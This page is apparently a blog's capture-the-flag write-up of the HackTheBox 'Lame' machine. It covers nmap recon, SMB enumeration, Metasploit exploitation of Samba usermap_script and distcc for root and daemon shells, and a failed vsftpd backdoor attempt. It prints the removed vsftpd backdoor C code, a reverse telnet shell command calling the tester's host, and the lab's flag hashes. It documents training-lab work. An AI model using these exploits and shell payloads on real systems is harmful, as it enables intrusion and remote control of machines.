@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || HackTheBox - lame</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">HackTheBox - lame</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="October 15, 2020">
+      Oct 15
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/hackthebox">hackthebox</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/smb">smb</a>
+    <a href="https://shiny-labs.re/tags/cve">cve</a>
+    <a href="https://shiny-labs.re/tags"></a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="recon">Recon</h1>
+<p>As usual, let&rsquo;s run nmap to see what we are up against ~~</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">export</span> <span class="nv">TARGET</span><span class="o">=</span>10.10.10.3
+sudo nmap -T4 -p- -A -oA nmap_tcp <span class="nv">$TARGET</span>
+</code></pre></div><p>Here&rsquo;s a summary of nmaps' results (only open ports are included, the last column is completed when I have results):</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Vulnerable?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21/tcp</td>
+<td>ftp</td>
+<td>vsftpd 2.3.4</td>
+<td>no</td>
+</tr>
+<tr>
+<td>22/tcp</td>
+<td>ssh</td>
+<td>OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</td>
+<td>maybe?</td>
+</tr>
+<tr>
+<td>139/tcp</td>
+<td>netbios-ssn</td>
+<td>Samba smbd 3.X – 4.X (workgroup: WORKGROUP)</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>445/tcp</td>
+<td>netbios-ssn</td>
+<td>Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>3632/tcp</td>
+<td>distccd</td>
+<td>distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</td>
+<td>yes</td>
+</tr>
+</tbody>
+</table>
+<h1 id="services">Services</h1>
+<h2 id="21tcp-vsftpd-234">21/tcp vsftpd 2.3.4</h2>
+<h3 id="anonymous-login">Anonymous login</h3>
+<p>Anonymous login is enabled, let&rsquo;s see if we have anything interesting on the ftp:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ftp 10.10.10.3
+Connected to 10.10.10.3.
+<span class="m">220</span> <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.3:kali<span class="o">)</span>: anonymous
+<span class="m">331</span> Please specify the password.
+Password:
+<span class="m">230</span> Login successful.
+Remote system <span class="nb">type</span> is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
+<span class="m">150</span> Here comes the directory listing.
+<span class="m">226</span> Directory send OK.
+</code></pre></div><p>Nothing to see here, moving along!</p>
+<h3 id="vsftpd-234-backdoor-exploit">vsftpd 2.3.4 backdoor exploit</h3>
+<p>That version of vsftpd is vulnerable to a backdoor exploit:</p>
+<ul>
+<li><a href="https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor">https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor</a></li>
+<li><a href="https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py">https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py</a></li>
+<li><a href="https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html">https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html</a></li>
+</ul>
+<blockquote>
+<p>The backdoor payload is interesting. In response to a :) smiley face in the FTP username, a TCP callback shell is attempted.</p>
+</blockquote>
+<p>The code changes removing the backdoor can be found in <a href="https://pastebin.com/AetT9sS5">this pastebin</a>. That snippet of code checks for the smiley (0x3a is <code>:</code> and 0x29 is <code>)</code>)</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="o">---</span> <span class="n">vsftpd</span><span class="o">-</span><span class="mf">2.3.4</span><span class="o">/</span><span class="n">str</span><span class="p">.</span><span class="n">c</span>  <span class="mi">2011</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">30</span> <span class="mi">15</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mf">38.000000000</span> <span class="o">+</span><span class="mo">0200</span>
+<span class="o">+++</span> <span class="n">vsftpd</span><span class="o">-</span><span class="mf">2.3.4.4</span><span class="n">players</span><span class="o">/</span><span class="n">str</span><span class="p">.</span><span class="n">c</span> <span class="mi">2008</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">17</span> <span class="mo">06</span><span class="o">:</span><span class="mi">54</span><span class="o">:</span><span class="mf">16.000000000</span> <span class="o">+</span><span class="mo">0100</span>
+<span class="err">@@</span> <span class="o">-</span><span class="mi">569</span><span class="p">,</span><span class="mi">11</span> <span class="o">+</span><span class="mi">569</span><span class="p">,</span><span class="mi">6</span> <span class="err">@@</span>
+     <span class="p">{</span>
+       <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+     <span class="p">}</span>
+<span class="o">-</span>    <span class="k">else</span> <span class="k">if</span><span class="p">((</span><span class="n">p_str</span><span class="o">-&gt;</span><span class="n">p_buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mh">0x3a</span><span class="p">)</span>
+<span class="o">-</span>    <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">p_str</span><span class="o">-&gt;</span><span class="n">p_buf</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="mh">0x29</span><span class="p">))</span>
+<span class="o">-</span>    <span class="p">{</span>
+<span class="o">-</span>      <span class="n">vsf_sysutil_extra</span><span class="p">();</span>
+<span class="o">-</span>    <span class="p">}</span>
+</code></pre></div><p>And this part spawns a TCP reverse shell, on port 6200.</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="o">---</span> <span class="n">vsftpd</span><span class="o">-</span><span class="mf">2.3.4</span><span class="o">/</span><span class="n">sysdeputil</span><span class="p">.</span><span class="n">c</span>   <span class="mi">2011</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">30</span> <span class="mi">15</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mf">00.000000000</span> <span class="o">+</span><span class="mo">0200</span>
+<span class="o">+++</span> <span class="n">vsftpd</span><span class="o">-</span><span class="mf">2.3.4.4</span><span class="n">players</span><span class="o">/</span><span class="n">sysdeputil</span><span class="p">.</span><span class="n">c</span>  <span class="mi">2010</span><span class="o">-</span><span class="mo">03</span><span class="o">-</span><span class="mi">26</span> <span class="mo">04</span><span class="o">:</span><span class="mi">25</span><span class="o">:</span><span class="mf">33.000000000</span> <span class="o">+</span><span class="mo">0100</span>
+<span class="o">-</span><span class="kt">int</span>
+<span class="o">-</span><span class="n">vsf_sysutil_extra</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="o">-</span><span class="p">{</span>
+<span class="o">-</span>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rfd</span><span class="p">;</span>
+<span class="o">-</span>  <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sa</span><span class="p">;</span>
+<span class="o">-</span>  <span class="k">if</span><span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+<span class="o">-</span>  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="o">-</span>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
+<span class="o">-</span>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+<span class="o">-</span>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">6200</span><span class="p">);</span>
+<span class="o">-</span>  <span class="n">sa</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+<span class="o">-</span>  <span class="k">if</span><span class="p">((</span><span class="n">bind</span><span class="p">(</span><span class="n">fd</span><span class="p">,(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span>
+<span class="o">-</span>  <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="p">)))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="o">-</span>  <span class="k">if</span><span class="p">((</span><span class="n">listen</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">100</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="o">-</span>  <span class="k">for</span><span class="p">(;;)</span>
+<span class="o">-</span>  <span class="p">{</span>
+<span class="o">-</span>    <span class="n">rfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="o">-</span>    <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="n">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="o">-</span>    <span class="n">dup2</span><span class="p">(</span><span class="n">rfd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="n">dup2</span><span class="p">(</span><span class="n">rfd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> <span class="n">dup2</span><span class="p">(</span><span class="n">rfd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+<span class="o">-</span>    <span class="n">execl</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s">&#34;sh&#34;</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span>
+<span class="o">-</span>  <span class="p">}</span>
+<span class="o">-</span><span class="p">}</span>
+</code></pre></div><p>That sounds easy enough to trigger, let&rsquo;s try:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~$ ftp <span class="nv">$TARGET</span>
+Connected to 10.10.10.3.
+<span class="m">220</span> <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.3:kali<span class="o">)</span>: :<span class="o">)</span>
+<span class="m">331</span> Please specify the password.
+Password: &lt;enter&gt;
+<span class="m">530</span> Login incorrect.
+Login failed.
+ftp&gt; <span class="m">221</span> Goodbye.
+</code></pre></div><p>But it doesn&rsquo;t seem like anything popped on the port 6200</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~$ sudo nmap -p <span class="m">6200</span> <span class="nv">$TARGET</span>
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-12 15:52 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.3
+Host is up <span class="o">(</span>0.046s latency<span class="o">)</span>.
+
+PORT     STATE    SERVICE
+6200/tcp filtered lm-x
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.73 seconds
+</code></pre></div><p>I also tried with the metasploit module, but it didn&rsquo;t work either.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ msfconsole
+msf5 &gt; search vsftp
+Matching <span class="nv">Modules</span>
+<span class="o">================</span>
+
+   <span class="c1">#  Name                                  Disclosure Date  Rank       Check  Description</span>
+   -  ----                                  ---------------  ----       -----  -----------
+   <span class="m">0</span>  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
+
+msf5 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.3
+<span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.3
+msf5 exploit<span class="o">(</span>unix/ftp/vsftpd_234_backdoor<span class="o">)</span> &gt; run
+
+<span class="o">[</span>*<span class="o">]</span> 10.10.10.3:21 - Banner: <span class="m">220</span> <span class="o">(</span>vsFTPd 2.3.4<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> 10.10.10.3:21 - USER: <span class="m">331</span> Please specify the password.
+<span class="o">[</span>*<span class="o">]</span> Exploit completed, but no session was created.
+</code></pre></div><h2 id="22tcp--openssh-47p1-debian9ubuntu1">22/TCP  openSSH 4.7p1 Debian9ubuntu1</h2>
+<p>These SSH keys might be weak keys, which are bruteforceable.</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/5720">https://www.exploit-db.com/exploits/5720</a></li>
+<li><a href="https://hackingandsecurity.blogspot.com/2016/06/metasploitable-2.html">https://hackingandsecurity.blogspot.com/2016/06/metasploitable-2.html</a></li>
+</ul>
+<p>I tried the 5720 exploit from exploit-db but the bruteforce was extremely slow, I gave up on it.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~$ python2 5720.py rsa/2048 10.10.10.3 root <span class="m">22</span>
+</code></pre></div><h2 id="139445tcp-smb">139,445/TCP smb</h2>
+<p>Let&rsquo;s start with some basic Samba enumeration:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">smbclient -L \\\\10.10.10.3
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
+</code></pre></div><h3 id="fixing-old-samba-versions-in-kali">Fixing Old Samba Versions In Kali</h3>
+<p>Hum, maybe that samba is very old and uses smbv1? Which is disabled by default in kali. To re-enable it, edit <code>smb.conf</code> and add <code>client min protocol = NT1</code> in the <code>Global Settings</code> section:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo vim /etc/samba/smb.conf
+#======================= Global Settings =======================
+
+[global]
+client min protocol = NT1
+</code></pre></div><p>Then restart the smd daemon:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">systemctl restart smbd.service
+</code></pre></div><p>The enumeration should work better:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ smbclient -L <span class="se">\\\\</span>10.10.10.3
+Enter WORKGROUP<span class="se">\k</span>ali<span class="err">&#39;</span>s password:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk
+        IPC$            IPC       IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
+        ADMIN$          IPC       IPC Service <span class="o">(</span>lame server <span class="o">(</span>Samba 3.0.20-Debian<span class="o">))</span>
+Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+Anonymous login successful
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            LAME
+</code></pre></div><p>No access to anything though :((</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ smbclient <span class="se">\\\\</span>10.10.10.3<span class="se">\\</span>tmp
+Enter WORKGROUP<span class="se">\k</span>ali<span class="err">&#39;</span>s password:
+Anonymous login successful
+Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> ls
+  .                                   D        <span class="m">0</span>  Sat Oct <span class="m">10</span> 00:48:57 <span class="m">2020</span>
+  ..                                 DR        <span class="m">0</span>  Sun May <span class="m">20</span> 14:36:12 <span class="m">2012</span>
+  5145.jsvc_up                        R        <span class="m">0</span>  Fri Oct  <span class="m">9</span> 12:25:59 <span class="m">2020</span>
+  .ICE-unix                          DH        <span class="m">0</span>  Fri Oct  <span class="m">9</span> 12:24:57 <span class="m">2020</span>
+  .X11-unix                          DH        <span class="m">0</span>  Fri Oct  <span class="m">9</span> 12:25:22 <span class="m">2020</span>
+  .X0-lock                           HR       <span class="m">11</span>  Fri Oct  <span class="m">9</span> 12:25:22 <span class="m">2020</span>
+
+                <span class="m">7282168</span> blocks of size 1024. <span class="m">5678680</span> blocks available
+smb: <span class="se">\&gt;</span> get 5145.jsvc_up
+NT_STATUS_ACCESS_DENIED opening remote file <span class="se">\5</span>145.jsvc_up
+</code></pre></div><p>All the files have a size of 0, nothing to grab here, moving along ~~</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ smbclient <span class="se">\\\\</span>10.10.10.3<span class="se">\\</span>opt
+Enter WORKGROUP<span class="se">\k</span>ali<span class="err">&#39;</span>s password:
+Anonymous login successful
+tree connect failed: NT_STATUS_ACCESS_DENIED
+</code></pre></div><h3 id="smb-usermap_script">SMB usermap_script</h3>
+<p>We got the Samba version from the nmap scan:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> smb-os-discovery:
+|   OS: Unix (Samba 3.0.20-Debian)
+</code></pre></div><p>Looking for exploits affecting that version, one stumbles upon <a href="https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script">https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script</a>. And that exploit is included in metasploit:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(multi/samba/usermap_script) &gt; set RHOSTS 10.10.10.3
+RHOSTS =&gt; 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) &gt; run
+
+[*] Started reverse TCP handler on 172.16.149.135:4444
+[*] Exploit completed, but no session was created.
+</code></pre></div><p>No shell :(( Some more rabbit holes later, I realized that my LHOST was pointing to the wrong IP address (it should be the one assigned to your tun0 interface)</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(multi/samba/usermap_script) &gt; set LHOST 10.10.14.17
+LHOST =&gt; 10.10.14.17
+msf5 exploit(multi/samba/usermap_script) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.17:4444
+[*] Command shell session 1 opened (10.10.14.17:4444 -&gt; 10.10.10.3:42784) at 2020-10-13 11:58:48 -0400
+id
+uid=0(root) gid=0(root)
+</code></pre></div><p>Additional note: apparently, <code>set LHOST tun0</code> also works, which is even better!</p>
+<p>And there we have our root account!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">cat root/root.txt
+92caac3be140ef409e45721348a4e9df
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">cat /home/makis/user.txt
+69454a937d94f5f0225ea00acd2e84c5
+</code></pre></div><h2 id="3632tcp-distccd">3632/TCP distccd</h2>
+<ul>
+<li><a href="https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec">https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec</a></li>
+</ul>
+<p>Still looking around, let&rsquo;s check if distcc has any public exploit in metasploit:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 &gt; search distcc
+
+Matching Modules
+================
+
+   #  Name                           Disclosure Date  Rank       Check  Description
+   -  ----                           ---------------  ----       -----  -----------
+   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+
+
+msf5 &gt; use 0
+msf5 exploit(unix/misc/distcc_exec) &gt; show options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT   3632             yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+msf5 exploit(unix/misc/distcc_exec) &gt; set RHOSTS 10.10.10.3
+RHOSTS =&gt; 10.10.10.3
+msf5 exploit(unix/misc/distcc_exec) &gt; run
+
+[*] Started bind TCP handler against 10.10.10.3:4444
+[*] Exploit completed, but no session was created.
+</code></pre></div><p>After a bunch of trial and error on which payload to use:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(unix/misc/distcc_exec) &gt; show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                Disclosure Date  Rank    Check  Description
+   -   ----                                ---------------  ----    -----  -----------
+   0   cmd/unix/bind_perl                                   manual  No     Unix Command Shell, Bind TCP (via Perl)
+   1   cmd/unix/bind_perl_ipv6                              manual  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   2   cmd/unix/bind_ruby                                   manual  No     Unix Command Shell, Bind TCP (via Ruby)
+   3   cmd/unix/bind_ruby_ipv6                              manual  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   4   cmd/unix/generic                                     manual  No     Unix Command, Generic Command Execution
+   5   cmd/unix/reverse                                     manual  No     Unix Command Shell, Double Reverse TCP (telnet)
+   6   cmd/unix/reverse_bash                                manual  No     Unix Command Shell, Reverse TCP (/dev/tcp)
+   7   cmd/unix/reverse_bash_telnet_ssl                     manual  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   8   cmd/unix/reverse_openssl                             manual  No     Unix Command Shell, Double Reverse TCP SSL (openssl)
+   9   cmd/unix/reverse_perl                                manual  No     Unix Command Shell, Reverse TCP (via Perl)
+   10  cmd/unix/reverse_perl_ssl                            manual  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   11  cmd/unix/reverse_ruby                                manual  No     Unix Command Shell, Reverse TCP (via Ruby)
+   12  cmd/unix/reverse_ruby_ssl                            manual  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   13  cmd/unix/reverse_ssl_double_telnet                   manual  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf5 exploit(unix/misc/distcc_exec) &gt; set payload 5
+payload =&gt; cmd/unix/reverse
+msf5 exploit(unix/misc/distcc_exec) &gt; run
+
+[+] sh -c &#39;(sleep 4602|telnet 10.10.14.17 4444|while : ; do sh &amp;&amp; break; done 2&gt;&amp;1|telnet 10.10.14.17 4444 &gt;/dev/null 2&gt;&amp;1 &amp;)&#39;
+[*] Started reverse TCP double handler on 10.10.14.17:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo xVz84ZvmAfxqZKH8;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: &#34;xVz84ZvmAfxqZKH8\r\n&#34;
+[*] Matching...
+[*] A is input...
+[*] Command shell session 3 opened (10.10.14.17:4444 -&gt; 10.10.10.3:40303) at 2020-10-13 16:45:09 -0400
+
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+cat /root/root.txt
+cat: /root/root.txt: Permission denied
+cat /home/makis/user.txt
+69454a937d94f5f0225ea00acd2e84c5
+</code></pre></div><p>Using the <code>Double Reverse TCP (Telnet)</code> finally yielded some results!</p>
+<p>However, we only gain access to a <code>daemon</code> account, which allows us to see <code>user.txt</code> but we definitely don&rsquo;t have root privileges.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+cat /root/root.txt
+cat: /root/root.txt: Permission denied
+cat /home/makis/user.txt
+&lt;some_hash_here&gt;
+</code></pre></div><h1 id="summary">Summary</h1>
+<p>That machine looks disturbingly similar to metaploitable2 but with some modifications&hellip;</p>
+<ul>
+<li>The <code>distcc_exec</code> vulnerabililty allows us to have a non-privileged shell</li>
+<li>The SMB <code>usermap_script</code> vulnerability allows us to get a root shell</li>
+</ul>
+<p><img src="img/giphy.gif" alt="Black Cat GIF by Perecz Annabella"></p>
+
+        </div>
+    </article>
+</div>
+
+
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#services">Services</a>
+      <ul>
+        <li><a href="#21tcp-vsftpd-234">21/tcp vsftpd 2.3.4</a>
+          <ul>
+            <li><a href="#anonymous-login">Anonymous login</a></li>
+            <li><a href="#vsftpd-234-backdoor-exploit">vsftpd 2.3.4 backdoor exploit</a></li>
+          </ul>
+        </li>
+        <li><a href="#22tcp--openssh-47p1-debian9ubuntu1">22/TCP  openSSH 4.7p1 Debian9ubuntu1</a></li>
+        <li><a href="#139445tcp-smb">139,445/TCP smb</a>
+          <ul>
+            <li><a href="#fixing-old-samba-versions-in-kali">Fixing Old Samba Versions In Kali</a></li>
+            <li><a href="#smb-usermap_script">SMB usermap_script</a></li>
+          </ul>
+        </li>
+        <li><a href="#3632tcp-distccd">3632/TCP distccd</a></li>
+      </ul>
+    </li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+        <div class="copyright">
+        
+            Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma
+        
+        </div>
+
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
